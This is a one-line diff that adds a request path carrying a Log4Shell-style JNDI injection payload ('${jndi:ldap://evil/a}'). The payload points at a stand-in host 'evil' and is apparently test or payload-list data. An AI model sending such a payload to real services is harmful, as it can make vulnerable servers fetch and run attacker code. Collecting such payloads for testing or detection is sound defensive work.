@@ -1,0 +1,1 @@
+/lookup?x=${jndi:ldap://evil/a}
